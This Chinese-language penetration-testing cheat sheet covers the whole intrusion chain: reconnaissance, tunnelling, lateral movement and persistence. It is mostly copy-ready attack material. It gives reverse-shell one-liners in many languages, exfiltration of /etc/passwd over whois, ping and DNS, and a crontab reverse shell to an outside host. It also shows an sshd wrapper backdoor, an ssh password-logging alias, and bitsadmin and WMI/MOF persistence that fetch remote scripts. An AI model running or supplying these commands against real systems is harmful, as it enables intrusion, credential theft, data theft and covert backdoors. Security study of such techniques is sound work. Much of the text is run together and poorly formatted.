\n域传送漏洞\n\n\n\n\n\n\n\n\n\n\nLinux\ntxtdig @ns.example.com example=.com AXFR Windows\ntxtnslookup -type=ns xxx.yyy.cn #查询解析某域名的DNS服务器\nnslookup #进入nslookup交互模式\nserver dns.domian.com #指定dns服务器\nls xxx.yyy.cn #列出域信息\nGetDomainsBySSL.py :https://note.youdao.com/ynoteshare1/index.html?id=247d97fc1d98b122ef9804906356d47a&amp;type=note#/\ncensys.io证书 :https://censys.io/certificates?q=target.com\ncrt.sh证书查询:https://crt.sh/?q=%25.target.com\nshadon :https://www.shodan.io/\nzoomeye :https://www.zoomeye.org/\nfofa :https://fofa.so/\ncensys：https://censys.io/\ndnsdb.io :https://dnsdb.io/zh-cn/search?q=target.com\napi.hackertarget.com :http://api.hackertarget.com/reversedns/?q=target.com\ncommunity.riskiq.com :https://community.riskiq.com/Search/target.com\nsubdomain3 :https://github.com/yanxiu0614/subdomain3\nFuzzDomain :https://github.com/Chora10/FuzzDomain\ndnsdumpster.com :https://dnsdumpster.com/\nphpinfo.me :https://phpinfo.me/domain/\ndns开放数据接口 :https://dns.bufferover.run/dns?q=baidu.com\n\n进入内网基于企业弱账号漏洞\nVPN（通过邮箱，密码爆破，社工等途径获取VPN） \n企业相关运维系统（zabbix等）\n\n基于系统漏洞进入\nMetasploit(漏洞利用框架):https://github.com/rapid7/metasploit-framework \n漏洞利用脚本\n\n网站应用程序渗透\nSQL注入 \n跨站脚本（XSS） \n跨站请求伪造（CSRF） \nSSRF（ssrf_proxy） \n功能&#x2F;业务逻辑漏洞 \n其他漏洞等 \nCMS-内容管理系统漏洞 \n企业自建代理\n\n无线Wi-Fi接入隐匿攻击Command and Control\nICMP :https://pentestlab.blog/2017/07/28/command-and-control-icmp/\nDNS :https://pentestlab.blog/2017/09/06/command-and-control-dns/\nDropBox :https://pentestlab.blog/2017/08/29/command-and-control-dropbox/\nGmail :https://pentestlab.blog/2017/08/03/command-and-control-gmail/\nTelegram :http://drops.xmd5.com/static/drops/tips-16142.html\nTwitter :https://pentestlab.blog/2017/09/26/command-and-control-twitter/\nWebsite Keyword :https://pentestlab.blog/2017/09/14/command-and-control-website-keyword/\nPowerShell :https://pentestlab.blog/2017/08/19/command-and-control-powershell/\nWindows COM :https://pentestlab.blog/2017/09/01/command-and-control-windows-com/\nWebDAV :https://pentestlab.blog/2017/09/12/command-and-control-webdav/\nOffice 365 :https://www.anquanke.com/post/id/86974\nHTTPS :https://pentestlab.blog/2017/10/04/command-and-control-https/\nKernel :https://pentestlab.blog/2017/10/02/command-and-control-kernel/\nWebsite :https://pentestlab.blog/2017/11/14/command-and-control-website/\nWMI :https://pentestlab.blog/2017/11/20/command-and-control-wmi/\nWebSocket :https://pentestlab.blog/2017/12/06/command-and-control-websocket/\nImages :https://pentestlab.blog/2018/01/02/command-and-control-images/\nWeb Interface :https://pentestlab.blog/2018/01/03/command-and-control-web-interface/\nJavaScript :https://pentestlab.blog/2018/01/08/command-and-control-javascript/\n…\n\nFronting\nDomain Fronting \nTor_Fronting.\n\n代理\nVPN \nshadowsockts :https://github.com/shadowsocks\nHTTP :http://cn-proxy.com/\nTor\n\n内网跨边界应用内网跨边界转发\nNC端口转发 \nLCX端口转发 \nnps -&gt; 个人用觉得比较稳定 ～\nfrp\n代理脚本 \nTunna \nReduh \n\n\n…\n\n内网跨边界代理穿透EW正向 SOCKS v5 服务器:\ntxt./ew -s ssocksd -l 1080 反弹 SOCKS v5 服务器:a) 先在一台具有公网 ip 的主机A上运行以下命令：\ntxt$ ./ew -s rcsocks -l 1080 -e 8888 \nb) 在目标主机B上启动 SOCKS v5 服务 并反弹到公网主机的 8888端口\ntxt$ ./ew -s rssocks -d 1.1.1.1 -e 8888 多级级联\ntxt$ ./ew -s lcx_listen -l 1080 -e 8888\n$ ./ew -s lcx_tran -l 1080 -f 2.2.2.3 -g 9999\n$ ./ew -s lcx_slave -d 1.1.1.1 -e 8888 -f 2.2.2.3 -g 9999lcx_tran 的用法\ntxt$ ./ew -s ssocksd -l 9999\n$ ./ew -s lcx_tran -l 1080 -f 127.0.0.1 -g 9999lcx_listen、lcx_slave 的用法\ntxt$ ./ew -s lcx_listen -l 1080 -e 8888\n$ ./ew -s ssocksd -l 9999\n$ ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999“三级级联”的本地SOCKS测试用例以供参考\ntxt$ ./ew -s rcsocks -l 1080 -e 8888\n$ ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999\n$ ./ew -s lcx_listen -l 9999 -e 7777\n$ ./ew -s rssocks -d 127.0.0.1 -e 7777Termite使用说明:https://rootkiter.com/Termite/README.txt \n代理脚本reGeorg :https://github.com/sensepost/reGeorgNeo-reGeorg:https://github.com/L-codes/Neo-reGeorgpystinger(毒刺):https://github.com/FunnyWolf/pystingerABPTTS:https://github.com/nccgroup/ABPTTS\nshell反弹bash  \ntxtbash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1perl \ntxtperl -e &#39;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#39;python \ntxtpython -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;php \ntxtphp -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;ruby \ntxtruby -rsocket -e&#39;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;java \ntxtr = Runtime.getRuntime()\np = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \\$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])\np.waitFor()nc \ntxt#使用-e \nnc -e /bin/sh 223.8.200.234 1234 txt#不使用-e\nmknod /tmp/backpipe p\n/bin/sh 0/tmp/backpipe | nc attackerip listenport 1&gt;/tmp/backpipelua \ntxtlua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t=socket.tcp();t:connect(&#39;202.103.243.122&#39;,&#39;1234&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;内网文件的传输和下载wput \ntxtwput dir_name ftp://linuxpig:123456@host.com/wget \ntxtwget http://site.com/1.rar -O 1.rarariac2（需安装） \ntxtaria2c -o owncloud.zip https://download.owncloud.org/community/owncloud-9.0.0.tar.bz2powershell\ntxt$p = New-Object System.Net.WebClient \n$p.DownloadFile(&quot;http://domain/file&quot;,&quot;C:%homepath%file&quot;) vbs脚本 \ntxtSet args = Wscript.Arguments\nUrl = &quot;http://domain/file&quot;\ndim xHttp: Set xHttp = createobject(&quot;Microsoft.XMLHTTP&quot;)\ndim bStrm: Set bStrm = createobject(&quot;Adodb.Stream&quot;)\nxHttp.Open &quot;GET&quot;, Url, False\nxHttp.Send\nwith bStrm\n.type = 1 &#39;\n.open\n.write xHttp.responseBody\n.savetofile &quot; C:\\%homepath%\\file&quot;, 2 &#39;\nend with\n\n\n\n\n\n\n\n\n执行 ：cscript test.vbs\nPerl \ntxt#!/usr/bin/perl \nuse LWP::Simple; \ngetstore(&quot;http://domain/file&quot;, &quot;file&quot;);\n\n\n\n\n\n\n\n\n执行：perl test.pl\nPython \ntxt#!/usr/bin/python \nimport urllib2 \nu = urllib2.urlopen(&#39;http://domain/file&#39;) \nlocalFile = open(&#39;local_file&#39;, &#39;w&#39;) \nlocalFile.write(u.read()) \nlocalFile.close()\n\n\n\n\n\n\n\n\n执行：python test.py\nRuby \ntxt#!/usr/bin/ruby\nrequire &#39;net/http&#39;\nNet::HTTP.start(&quot;www.domain.com&quot;) &#123; |http|\nr = http.get(&quot;/file&quot;)\nopen(&quot;save_location&quot;, &quot;wb&quot;) &#123; |file|\nfile.write(r.body)\n&#125;\n&#125;\n\n\n\n\n\n\n\n\n执行：ruby test.rb\nPHP \ntxt&lt;?php\n$url  = &#39;http://www.example.com/file&#39;;\n$path = &#39;/path/to/file&#39;;\n$ch = curl_init($url);\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n$data = curl_exec($ch);\ncurl_close($ch);\nfile_put_contents($path, $data);\n?&gt;\n\n\n\n\n\n\n\n\n执行：php test.php\nNCattacker \ntxtcat file | nc -l 1234target\ntxtnc host_ip 1234 &gt; fileFTP\ntxtftp 127.0.0.1 username password get file exitTFTP \ntxttftp -i host GET C:%homepath%file location_of_file_on_tftp_serverBitsadmin \ntxtbitsadmin /transfer n http://domain/file c:%homepath%fileWindow 文件共享 \ntxtnet use x: \\127.0.0.1\\share /user:example.comuserID myPasswordSCP本地到远程 \ntxtscp file user@host.com:/tmp远程到本地 \ntxtscp user@host.com:/tmp filersync远程rsync服务器中拷贝文件到本地机 \ntxtrsync -av root@192.168.78.192::www /databack本地机器拷贝文件到远程rsync服务器 \ntxtrsync -av /databack root@192.168.78.192::wwwcertutil.exe \ntxtcertutil.exe -urlcache -split -f http://site.com/filecopy\ntxtcopy \\\\IP\\ShareName\\file.exe file.exeWHOIS接收端 Host B：\ntxtnc -vlnp 1337 | sed &quot;s/ //g&quot; | base64 -d 发送端 Host A：\ntxtwhois -h host_ip -p 1337 `cat /etc/passwd | base64`WHOIS + TARFirst:  \ntxtncat -k -l -p 4444 | tee files.b64  #tee to a file so you can make sure you have itNext\ntxttar czf - /tmp/* | base64 | xargs -I bits timeout 0.03 whois -h host_ip -p 4444 bitsFinally\ntxtcat files.b64 | tr -d &#39;\\r\\n&#39; | base64 -d | tar zxv #to get the files outPING发送端:\ntxtxxd -p -c 4 secret.txt | while read line; do ping -c 1 -p $line ip; done接收端ping_receiver.py:\ntxtimport sys\n\ntry:\n    from scapy.all import *\nexcept:\n    print(&quot;Scapy not found, please install scapy: pip install scapy&quot;)\n    sys.exit(0)\n\n\ndef process_packet(pkt):\n    if pkt.haslayer(ICMP):\n        if pkt[ICMP].type == 8:\n            data = pkt[ICMP].load[-4:]\n            print(f&#39;&#123;data.decode(&quot;utf-8&quot;)&#125;&#39;, flush=True, end=&quot;&quot;, sep=&quot;&quot;)\n\nsniff(iface=&quot;eth0&quot;, prn=process_packet)txtpython3 ping_receiver.pyDIG发送端:\ntxtxxd -p -c 31 /etc/passwd | while read line; do dig @172.16.1.100 +short +tries=1 +time=1 $line.gooogle.com; done接收端dns_reciver.py:\ntxttry:\n    from scapy.all import *\nexcept:\n    print(&quot;Scapy not found, please install scapy: pip install scapy&quot;)\n\ndef process_packet(pkt):\n    if pkt.haslayer(DNS):\n        domain = pkt[DNS][DNSQR].qname.decode(&#39;utf-8&#39;)\n        root_domain = domain.split(&#39;.&#39;)[1]\n        if root_domain.startswith(&#39;gooogle&#39;):\n            print(f&#39;&#123;bytearray.fromhex(domain[:-13]).decode(&quot;utf-8&quot;)&#125;&#39;, flush=True, end=&#39;&#39;)\n\nsniff(iface=&quot;eth0&quot;, prn=process_packet)txtpython3 dns_reciver.py… \n搭建 HTTP serverpython2\ntxtpython -m SimpleHTTPServer 1337python3\ntxtpython -m http.server 1337PHP 5.4+\ntxtphp -S 0.0.0.0:1337ruby\ntxtruby -rwebrick -e&#39;WEBrick::HTTPServer.new(:Port =&gt; 1337, :DocumentRoot =&gt; Dir.pwd).start&#39;txtruby -run -e httpd . -p 1337Perl\ntxtperl -MHTTP::Server::Brick -e &#39;$s=HTTP::Server::Brick-&gt;new(port=&gt;1337); $s-&gt;mount(&quot;/&quot;=&gt;&#123;path=&gt;&quot;.&quot;&#125;); $s-&gt;start&#39;txtperl -MIO::All -e &#39;io(&quot;:8080&quot;)-&gt;fork-&gt;accept-&gt;(sub &#123; $_[0] &lt; io(-x $1 +? &quot;./$1 |&quot; : $1) if /^GET \\/(.*) / &#125;)&#39;busybox httpd\ntxtbusybox httpd -f -p 8000内网信息搜集本机信息搜集1、用户列表windows用户列表分析邮件用户，内网[域]邮件用户，通常就是内网[域]用户 \n2、进程列表析杀毒软件&#x2F;安全监控工具等邮件客户端VPNftp等  \n3、服务列表与安全防范工具有关服务[判断是否可以手动开关等]存在问题的服务[权限&#x2F;漏洞]\n4、端口列表开放端口对应的常见服务&#x2F;应用程序[匿名&#x2F;权限&#x2F;漏洞等]利用端口进行信息收集\n5、补丁列表分析 Windows 补丁第三方软件[Java&#x2F;Oracle&#x2F;Flash 等]漏洞\n6、本机共享本机共享列表&#x2F;访问权限本机访问的域共享&#x2F;访问权限\n7、本用户习惯分析历史记录收藏夹文档等 \n8、获取当前用户密码工具Windows\nmimikatz  \nwce  \nInvoke-WCMDump  \nmimiDbg  \nLaZagne\nnirsoft_package\nQuarksPwDump fgdump\n星号查看器等\n\nLinux\nLaZagne  \nmimipenguin\n\n浏览器\nHackBrowserData\nSharpWeb\nSharpDPAPI\n360SafeBrowsergetpass\n\n其他\nSharpDecryptPwd\nDecrypt_Weblogic_Password\nOA-Seeyou\n\n扩散信息收集端口扫描常用端口扫描工具\nnmap \nmasscan \nzmap\ns扫描器 \n自写脚本等 \nNC \n…\n\n内网拓扑架构分析\nDMZ\n管理网\n生产网\n测试网\n\n常见信息收集命令ipconfig:\ntxtipconfig /all ------&gt; 查询本机 IP 段，所在域等net:\ntxtnet user ------&gt; 本机用户列表\nnet localgroup administrators ------&gt; 本机管理员[通常含有域用户]\nnet user /domain ------&gt; 查询域用户\nnet group /domain ------&gt; 查询域里面的工作组\nnet group &quot;domain admins&quot; /domain ------&gt; 查询域管理员用户组\nnet localgroup administrators /domain ------&gt; 登录本机的域管理员\nnet localgroup administrators workgroup\\user001 /add -----&gt;域用户添加到本机 net group &quot;Domain controllers&quot; -------&gt; 查看域控制器(如果有多台)\nnet view ------&gt; 查询同一域内机器列表 net view /domain ------&gt; 查询域列表\nnet view /domain:domainnamedsquery \ntxtdsquery computer domainroot -limit 65535 &amp;&amp; net group &quot;domain\ncomputers&quot; /domain ------&gt; 列出该域内所有机器名\ndsquery user domainroot -limit 65535 &amp;&amp; net user /domain------&gt;列出该域内所有用户名\ndsquery subnet ------&gt;列出该域内网段划分\ndsquery group &amp;&amp; net group /domain ------&gt;列出该域内分组 \ndsquery ou ------&gt;列出该域内组织单位 \ndsquery server &amp;&amp; net time /domain------&gt;列出该域内域控制器 第三方信息收集\nNETBIOS 信息收集 \nSMB 信息收集  \n空会话信息收集  \n漏洞信息收集等\n\n权限提升WindowsBypassUAC常用方法\n使用IFileOperation COM接口\n使用Wusa.exe的extract选项\n远程注入SHELLCODE 到傀儡进程\nDLL劫持，劫持系统的DLL文件\neventvwr.exe and registry hijacking\nsdclt.exe\nSilentCleanup\nwscript.exe\ncmstp.exe\n修改环境变量，劫持高权限.Net程序\n修改注册表HKCU\\Software\\Classes\\CLSID，劫持高权限程序\n直接提权过UAC\n\n常用工具\nUACME \nBypass-UAC \nYamabiko \n…\n\n提权\nwindows内核漏洞提权\n\n\n\n\n\n\n\n\n\n\n检测类:Windows-Exploit-Suggester,WinSystemHelper,wesng\n\n\n\n\n\n\n\n\n\n利用类:windows-kernel-exploits，BeRoot\n\n服务提权\n\n\n\n\n\n\n\n\n\n\n数据库服务，ftp服务等\n\nWINDOWS错误系统配置 \n系统服务的错误权限配置漏洞 \n不安全的注册表权限配置 \n不安全的文件&#x2F;文件夹权限配置 \n计划任务 \n任意用户以NT AUTHORITY\\SYSTEM权限安装msi \n提权脚本\n\n\n\n\n\n\n\n\n\n\nPowerUP,ElevateKit\nLinux内核溢出提权linux-kernel-exploits \n计划任务txtcrontab -l\nls -alh /var/spool/cron\nls -al /etc/ | grep cron\nls -al /etc/cron*\ncat /etc/cron*\ncat /etc/at.allow\ncat /etc/at.deny\ncat /etc/cron.allow\ncat /etc/cron.deny\ncat /etc/crontab\ncat /etc/anacrontab\ncat /var/spool/cron/crontabs/rootSUIDtxtfind / -user root -perm -4000 -print 2&gt;/dev/null\nfind / -perm -u=s -type f 2&gt;/dev/null\nfind / -user root -perm -4000 -exec ls -ldb &#123;&#125; \\;寻找可利用bin：https://gtfobins.github.io/\n系统服务的错误权限配置漏洞txtcat /var/apache2/config.inc\ncat /var/lib/mysql/mysql/user.MYD\ncat /root/anaconda-ks.cfg不安全的文件&#x2F;文件夹权限配置txtcat ~/.bash_history\ncat ~/.nano_history\ncat ~/.atftp_history\ncat ~/.mysql_history\ncat ~/.php_history找存储的明文用户名，密码txtgrep -i user [filename]\ngrep -i pass [filename]\ngrep -C 5 &quot;password&quot; [filename]\nfind . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot; # Joomla权限维持系统后门Windows1、密码记录工具WinlogonHackWinlogonHack 是一款用来劫取远程3389登录密码的工具，在 WinlogonHack 之前有 一个 Gina 木马主要用来截取 Windows 2000下的密码，WinlogonHack 主要用于截 取 Windows XP 以及 Windows 2003 Server。键盘记录器安装键盘记录的目地不光是记录本机密码，是记录管理员一切的密码，比如说信箱，WEB 网页密码等等，这样也可以得到管理员的很多信息。NTPass获取管理员口令,一般用 gina 方式来,但有些机器上安装了 pcanywhere 等软件，会导致远程登录的时候出现故障，本软件可实现无障碍截取口令。Linux 下 openssh 后门重新编译运行的sshd服务，用于记录用户的登陆密码。\n2、常用的存储Payload位置WMI :存储：\ntxt$StaticClass = New-Object Management.ManagementClass(&#39;root\\cimv2&#39;, $null,$null)\n$StaticClass.Name = &#39;Win32_Command&#39;\n$StaticClass.Put()\n$StaticClass.Properties.Add(&#39;Command&#39; , $Payload)\n$StaticClass.Put() 读取:\ntxt$Payload=([WmiClass] &#39;Win32_Command&#39;).Properties[&#39;Command&#39;].Value包含数字签名的PE文件利用文件hash的算法缺陷，向PE文件中隐藏Payload，同时不影响该PE文件的数字签名特殊ADS…\ntxttype putty.exe &gt; ...:putty.exe\nwmic process call create c:\\test\\ads\\...:putty.exe特殊COM文件\ntxttype putty.exe &gt; \\\\.\\C:\\test\\ads\\COM1:putty.exe\nwmic process call create \\\\.\\C:\\test\\ads\\COM1:putty.exe磁盘根目录\ntxttype putty.exe &gt;C:\\:putty.exe \nwmic process call create C:\\:putty.exe3、Run&#x2F;RunOnce Keys用户级 \ntxtHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce管理员 \ntxtHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run4、BootExecute Key由于smss.exe在Windows子系统加载之前启动，因此会调用配置子系统来加载当前的配置单元，具体注册表键值为：\ntxtHKLM\\SYSTEM\\CurrentControlSet\\Control\\hivelist\nHKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet002\\Control\\Session Manager5、Userinit KeyWinLogon进程加载的login scripts,具体键值：\ntxtHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon6、Startup KeystxtHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders7、Services创建服务 \ntxtsc create [ServerName] binPath= BinaryPathName8、Browser Helper Objects本质上是Internet Explorer启动时加载的DLL模块\ntxtHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Browser Helper Objects9、AppInit_DLLs加载User32.dll会加载的DLL\ntxtHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs10、文件关联txtHKEY_LOCAL_MACHINE\\Software\\Classes\nHKEY_CLASSES_ROOT11、bitsadmintxtbitsadmin /create backdoor\nbitsadmin /addfile backdoor %comspec% %temp%\\cmd.exe\nbitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe &quot;/u /s /i:https://host.com/calc.sct scrobj.dll&quot;\nbitsadmin /Resume backdoor12、mof txtpragma namespace(&quot;\\\\\\\\.\\\\root\\\\subscription&quot;) \ninstance of __EventFilter as $EventFilter\n&#123;\nEventNamespace = &quot;Root\\\\Cimv2&quot;;\nName = &quot;filtP1&quot;;\nQuery = &quot;Select * From __InstanceModificationEvent &quot;\n&quot;Where TargetInstance Isa \\&quot;Win32_LocalTime\\&quot; &quot;\n&quot;And TargetInstance.Second = 1&quot;;\nQueryLanguage = &quot;WQL&quot;;\n&#125;; \ninstance of ActiveScriptEventConsumer as $Consumer\n&#123;\nName = &quot;consP1&quot;;\nScriptingEngine = &quot;JScript&quot;;\nScriptText = &quot;GetObject(\\&quot;script:https://host.com/test\\&quot;)&quot;;\n&#125;; \ninstance of __FilterToConsumerBinding\n&#123;\nConsumer = $Consumer;\nFilter = $EventFilter;\n&#125;;管理员执行：\ntxtmofcomp test.mof13、wmi每隔60秒执行一次notepad.exe\ntxtwmic /NAMESPACE:&quot;\\\\root\\subscription&quot; PATH __EventFilter CREATE Name=&quot;BotFilter82&quot;, EventNameSpace=&quot;root\\cimv2&quot;,QueryLanguage=&quot;WQL&quot;, Query=&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#39;Win32_PerfFormattedData_PerfOS_System&#39;&quot;\nwmic /NAMESPACE:&quot;\\\\root\\subscription&quot; PATH CommandLineEventConsumer CREATE Name=&quot;BotConsumer23&quot;, ExecutablePath=&quot;C:\\Windows\\System32\\notepad.exe&quot;,CommandLineTemplate=&quot;C:\\Windows\\System32\\notepad.exe&quot;\nwmic /NAMESPACE:&quot;\\\\root\\subscription&quot; PATH __FilterToConsumerBinding CREATE Filter=&quot;__EventFilter.Name=\\&quot;BotFilter82\\&quot;&quot;, Consumer=&quot;CommandLineEventConsumer.Name=\\&quot;BotConsumer23\\&quot;&quot;14、Userland Persistence With Scheduled Tasks劫持计划任务UserTask，在系统启动时加载dll\ntxtfunction Invoke-ScheduledTaskComHandlerUserTask\n&#123;\n[CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = &#39;Medium&#39;)]\nParam (\n[Parameter(Mandatory = $True)]\n[ValidateNotNullOrEmpty()]\n[String]\n$Command,\n\n[Switch]\n$Force\n)\n$ScheduledTaskCommandPath = &quot;HKCU:\\Software\\Classes\\CLSID\\&#123;58fb76b9-ac85-4e55-ac04-427593b1d060&#125;\\InprocServer32&quot;\nif ($Force -or ((Get-ItemProperty -Path $ScheduledTaskCommandPath -Name &#39;(default)&#39; -ErrorAction SilentlyContinue) -eq $null))&#123;\nNew-Item $ScheduledTaskCommandPath -Force |\nNew-ItemProperty -Name &#39;(Default)&#39; -Value $Command -PropertyType string -Force | Out-Null\n&#125;else&#123;\nWrite-Verbose &quot;Key already exists, consider using -Force&quot;\nexit\n&#125;\n\nif (Test-Path $ScheduledTaskCommandPath) &#123;\nWrite-Verbose &quot;Created registry entries to hijack the UserTask&quot;\n&#125;else&#123;\nWrite-Warning &quot;Failed to create registry key, exiting&quot;\nexit\n&#125; \n&#125;\nInvoke-ScheduledTaskComHandlerUserTask -Command &quot;C:\\test\\testmsg.dll&quot; -Verbose15、Netshtxtnetsh add helper c:\\test\\netshtest.dll后门触发：每次调用netsh\n\n\n\n\n\n\n\n\n\ndll编写:https://github.com/outflanknl/NetshHelperBeacon\n16、Shim常用方式：InjectDllRedirectShortcutRedirectEXE\n17、DLL劫持通过Rattler自动枚举进程，检测是否存在可用dll劫持利用的进程使用：Procmon半自动测试更精准，常规生成的dll会导致程序执行报错或中断，使用AheadLib配合生成dll劫持利用源码不会影响程序执行工具：https://github.com/sensepost/rattler工具：https://github.com/Yonsm/AheadLib\n18、DoubleAgent 编写自定义Verifier provider DLL通过Application Verifier进行安装注入到目标进程执行payload每当目标进程启动，均会执行payload，相当于一个自启动的方式POC : https://github.com/Cybellum/DoubleAgent\n19、waitfor.exe 不支持自启动，但可远程主动激活，后台进程显示为waitfor.exePOC : https://github.com/3gstudent/Waitfor-Persistence\n20、AppDomainManager针对.Net程序，通过修改AppDomainManager能够劫持.Net程序的启动过程。如果劫持了系统常见.Net程序如powershell.exe的启动过程，向其添加payload，就能实现一种被动的后门触发机制\n21、Office劫持Office软件的特定功能:通过dll劫持,在Office软件执行特定功能时触发后门利用VSTO实现的office后门Office加载项\n\nWord WLL \nExcel XLL \nExcel VBA add-ins \nPowerPoint VBA add-ins\n\n\n\n\n\n\n\n\n\n\n参考1 ：https://3gstudent.github.io/Use-Office-to-maintain-persistence\n\n\n\n\n\n\n\n\n\n参考2 ：https://3gstudent.github.io/Office-Persistence-on-x64-operating-system\n22、CLR无需管理员权限的后门，并能够劫持所有.Net程序POC:https://github.com/3gstudent/CLR-Injection\n23、msdtc利用MSDTC服务加载dll，实现自启动，并绕过Autoruns对启动项的检测利用：向 %windir%\\system32\\目录添加dll并重命名为oci.dll\n24、Hijack CAccPropServicesClass and MMDeviceEnumerato利用COM组件，不需要重启系统，不需要管理员权限通过修改注册表实现POC：https://github.com/3gstudent/COM-Object-hijacking \n25、Hijack explorer.exeCOM组件劫持，不需要重启系统，不需要管理员权限通过修改注册表实现\ntxtHKCU\\Software\\Classes\\CLSID&#123;42aedc87-2188-41fd-b9a3-0c966feabec1&#125;\nHKCU\\Software\\Classes\\CLSID&#123;fbeb8a05-beee-4442-804e-409d6c4515e9&#125;\nHKCU\\Software\\Classes\\CLSID&#123;b5f8350b-0548-48b1-a6ee-88bd00b4a5e7&#125;\nHKCU\\Software\\Classes\\Wow6432Node\\CLSID&#123;BCDE0395-E52F-467C-8E3D-C4579291692E&#125;26、Windows FAX DLL Injection通过DLL劫持，劫持Explorer.exe对fxsst.dll的加载Explorer.exe在启动时会加载c:\\Windows\\System32\\fxsst.dll(服务默认开启，用于传真服务)将payload.dll保存在c:\\Windows\\fxsst.dll，能够实现dll劫持，劫持Explorer.exe对fxsst.dll的加载\n27、特殊注册表键值在注册表启动项创建特殊名称的注册表键值，用户正常情况下无法读取(使用Win32 API)，但系统能够执行(使用Native API)。\n《渗透技巧——“隐藏”注册表的创建》\n《渗透技巧——“隐藏”注册表的更多测试》\n28、快捷方式后门替换我的电脑快捷方式启动参数POC : https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Backdoor/LNK_backdoor.ps1\n29、Logon ScriptstxtNew-ItemProperty &quot;HKCU:\\Environment\\&quot; UserInitMprLogonScript -value &quot;c:\\test\\11.bat&quot; -propertyType string | Out-Null30、Password Filter DLL31、利用BHO实现IE浏览器劫持Linuxcrontab每60分钟反弹一次shell给dns.wuyun.org的53端口\ntxt#!bash\n(crontab -l;printf &quot;*/60 * * * * exec 9&lt;&gt; /dev/tcp/dns.wuyun.org/53;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\\rno crontab for `whoami`%100c\\n&quot;)|crontab -硬链接sshdtxt#!bash\nln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=2333;链接：ssh &#114;&#x6f;&#x6f;&#116;&#x40;&#49;&#57;&#x32;&#x2e;&#x31;&#54;&#x38;&#x2e;&#x32;&#48;&#x36;&#x2e;&#49;&#52;&#50; -p 2333\nSSH Server wrappertxt#!bash\ncd /usr/sbin\nmv sshd ../bin\necho &#39;#!/usr/bin/perl&#39; &gt;sshd\necho &#39;exec &quot;/bin/sh&quot; if (getpeername(STDIN) =~ /^..4A/);&#39; &gt;&gt;sshd\necho &#39;exec &#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&#39; &gt;&gt;sshd\nchmod u+x sshd\n//不用重启也行\n/etc/init.d/sshd restarttxtsocat STDIO TCP4:192.168.206.142:22,sourceport=13377SSH keyloggervim当前用户下的.bashrc文件,末尾添加\ntxt#!bash\nalias ssh=&#39;strace -o /tmp/sshpwd-`date &#39;+%d%h%m%s&#39;`.log -e read,write,connect -s2048 ssh&#39;source .bashrc\nCymothoa_进程注入backdoortxt./cymothoa -p 2270 -s 1 -y 7777txtnc -vv ip 7777rootkit\nopenssh_rootkit\nKbeast_rootkit \nMafix + Suterusu rootkit\n\nTools\nVegile \nbackdoor \n\nWEB后门PHP Meterpreter后门Aspx Meterpreter后门weevelywebacoo….\n横向渗透端口渗透端口扫描\n1.端口的指纹信息（版本信息） \n2.端口所对应运行的服务  \n3.常见的默认端口号  \n4.尝试弱口令\n\n端口爆破hydra \n端口弱口令\nNTScan  \nHscan  \n自写脚本\n\n端口溢出smb\n\nms08067 \nms17010 \nms11058 